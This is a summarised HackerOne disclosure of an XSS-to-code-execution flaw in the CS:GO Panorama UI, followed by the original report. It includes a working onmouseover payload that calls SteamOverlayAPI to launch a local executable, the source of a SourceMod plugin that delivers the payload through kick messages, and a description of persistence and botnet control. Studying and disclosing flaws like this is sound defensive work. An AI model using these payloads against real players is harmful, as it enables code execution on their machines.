# Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message

## Metadata
- **Source:** HackerOne
- **Report:** 631956 | https://hackerone.com/reports/631956
- **Submitted:** 2019-06-29
- **Reporter:** shayhelman
- **Program:** Counter-Strike: Global Offensive (CS:GO)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Cross-Site Scripting (XSS), Remote Code Execution (RCE), Improper Input Validation, Unsafe HTML Rendering
- **CVEs:** None
- **Category:** web-api

## Summary
CS:GO's Panorama UI framework unsafely renders HTML in disconnect/kick messages by enabling the html='true' attribute in popup_generic.xml. Attackers can inject malicious HTML/JavaScript payloads via kick messages on dedicated servers, triggering arbitrary code execution through event handlers like onmouseover combined with Panorama's SteamOverlayAPI.

## Attack scenario
1. Attacker sets up a malicious CS:GO dedicated server with SourceMod and a custom plugin
2. Victim is invited/tricked into joining the attacker's server
3. Server automatically kicks the victim with a specially crafted message containing XSS payload: <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://...')">
4. Kick notification popup appears in victim's CS:GO client with the unsanitized HTML rendered by Panorama
5. Victim moves mouse over the kick message text, triggering onmouseover event
6. JavaScript executes with SteamOverlayAPI.OpenExternalBrowserURL() launching arbitrary files or URLs, achieving RCE

## Root cause
The Panorama UI framework's popup_generic.xml file uses html='true' attribute on Label tags without sanitizing user-supplied input from kick/disconnect messages. The framework's limited HTML parser still supports dangerous event handlers like onmouseover, and the SteamOverlayAPI provides a vector to execute system commands via file:// URIs.

## Attacker mindset
An attacker recognizes that game UI frameworks often prioritize functionality over security. By analyzing extracted Panorama files for html='true' tags, they identify the popup system as exploitable. They understand that low-interaction triggers (mouse hover) maximize infection likelihood, and leverage the SteamOverlayAPI as an unintended RCE primitive.

## Defensive takeaways
- Never set html='true' on user-controlled input; use text-only rendering or implement strict HTML/CSS sandboxing
- Implement comprehensive input validation and sanitization for all user-supplied data, especially chat/message systems
- Disable or restrict dangerous Panorama event handlers (onmouseover, onclick) in user-visible messages
- Restrict API access: SteamOverlayAPI should not be callable from untrusted contexts; validate file:// URI handling
- Extract and audit all UI framework code for similar patterns; grep for html='true' attributes company-wide
- Implement Content Security Policy (CSP) equivalent restrictions in custom UI frameworks
- Require user interaction beyond hover for system-level operations
- Apply defense-in-depth: sanitize, validate, and restrict at multiple layers

## Variant hunting
Search for other Panorama XML files with html='true' on user-controlled fields (chat, lobby messages, player names, item descriptions). Test other message delivery vectors: friend invites, trade messages, group announcements. Analyze other event handlers (onclick, onload, onerror) for bypass opportunities. Check if similar patterns exist in other Source engine games using Panorama (Dota 2, Artifact). Review all Panorama APIs for unintended RCE primitives like SteamOverlayAPI.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1059 - Command and Scripting Interpreter
- T1203 - Exploitation for Client Execution
- T1598 - Phishing - Lure Victim to Malicious Website
- T1566 - Phishing
- T1204 - User Execution

## Notes
Report demonstrates excellent vulnerability research methodology: extraction of game assets, systematic code review (grep for html='true'), progressive exploitation (local test → remote server), and clear PoC. The vulnerability chain combines multiple weaknesses (XSS + unsafe API exposure). Similar to CVE patterns in browser engine bypasses. Requires user interaction (mouse hover) but in context of game UI, this is highly probable. Report references earlier similar Panorama XSS vulnerability (#470520), indicating systemic framework issues.

## Full report
<details><summary>Expand</summary>

## Overview
Counter-Strike: Global Offensive's UI is built of a framework called [Panorama](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama) which is heavily influenced by modern HTML/CSS with JS capabilities. Because of these properties, the UI becomes easily vulnerable to different types of code injection, most notably XSS.

Previously, it was discovered that a certain message-type sent through the lobby chat allowed anyone to send raw HTML strings that would then be parsed by the Panorama framework as valid HTML. The reason this XSS was possible was because of a certain Panorama tag that was left enabled.

In order to see how these Panorama files are constructed, you must extract them from the CS:GO files. By unzipping the file under `steamapps\common\Counter-Strike Global Offensive\csgo\panorama\code.pbin`, a plethora of UI files are revealed. In these files we can see how this lobby XSS was possible by looking in the file named `panorama\layout\chat.xml` on line `18` we can see 
```
<Label html="true" text="&lt;span class='chat-entry__name'&gt;{s:player_name}&lt;/span&gt; {s:msg}" acceptsinput="true" />
```

By having `html="true"` in a Panorama tag, any input is parsed as raw HTML. This is what lead to the discovery of this exploit. We grepped through all the Panorama layout files looking for any that contained `html="true"` and within a few seconds we found a particular file with the name `panorama\layout\popups\popup_generic.xml`. We knew that the disconnect message was utilizing this exact file which is when we started to test.

Our first payload was testing if an image could load via a custom disconnect message. So we tried a simple payload `disconnect "<img src='https://i.imgur.com/IbJKM0M.jpg'>"`, and after running it twice (for caching purposes), the cat appeared to our surprise. {F518974}

Now that we knew disconnect popups were exploitable, we tried to see if this could be done remotely through the kick function. We tested first on local servers with the `kickid` command but had no luck. We then setup a dedicated server with SourceMod and attemped to kick with `sm_kick`. This worked at first but it had a character limit which did not allow much room for meaningful payloads. After reading through SourceMod documentation, we found a function called ` KickClient()` which did not have a character limit. After testing with some common payloads, we concluded that `<a onmouseover='javascript:CODE'></a>` is the best method with the least amount of user interaction to trigger code execution since the Panorama HTML parser is very limited in the amount of working tags and event listeners which is highlighted [here](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama#.JS_.28Javascript.29).

## Steps to reproduce

* Setup a [dedicated CS:GO server](https://developer.valvesoftware.com/wiki/Counter-Strike:_Global_Offensive_Dedicated_Servers)
* Install [SourceMod](https://wiki.alliedmods.net/Installing_sourcemod) and [Metamod](https://www.sourcemm.net/)
* Download the attached SourceMod plugin and place it under `\addons\sourcemod\plugins\`: F518946
* Start up CS:GO and connect to the server
* Run this string in your client's console:
```
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

* Mouse over the text `The remote host stopped receiving communications and closed the connection.`

## PoC

{F518945}
Triggered with the command:
```
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

### SourceMod Kick Plugin Source F518946

```cpp
#include <sourcemod>

#pragma semicolon 1
#pragma newdecls required

public void OnPluginStart()
{
    RegConsoleCmd("sm_testkick", Cmd_Kick);
}

public Action Cmd_Kick(int client, int args)
{
    if (args <= 0) {
        PrintToChat(client, "No arguments provided - Usage: !testkick <Kick Message>");
        return Plugin_Handled;
    }

    char full[5120];
    GetCmdArgString(full, sizeof(full));

    for (int i = 0; i < 5; i++) {
        KickClient(client, full);
    }

    return Plugin_Handled;
}
```

## Impact

An attacker could achieve full system access to the victims computer. A dummy server can be setup with an autokick message containing the payload. The victim would just need to join the attackers server and they would become infected. Moreover, an attacker could trick a server owner into installing a malicious SourceMod plugin that would be able to deliver the malicious payload to anyone on the server.

Similar to #470520, the exploit can be triggered via browser by connecting the victim to an attacker controlled server.

This exploit could also be combined with any Panorama function present [here](https://developer.valvesoftware.com/wiki/CSGO_Panorama_API) in order to further mess with the game's functionality (such as starting and accepting a new match or displaying a custom popup message). The attacker virtually has full control over all UI features.

Even though the payload is only triggered via the `mouseover` event, because the way the message appears in the center of the victim's screen and the ability to fill the center of the screen with exploitable text, user interaction is negligible.

It is also possible to persist the Javascript code execution by hoisting a function to the scheduler. Eg. `$.Schedule(1, function)`. Furthermore, it is possible to set up a persistent remote connection to the victim's game instance by utilizing `eval()` and `$.AsyncWebRequest()` which would allow the attacker to manage multiple victims in some sort of botnet.

Yours respectfully,
Shay @shayhelman and Felix @dukebruno123

</details>

---
*Analysed by Claude on 2026-05-11*
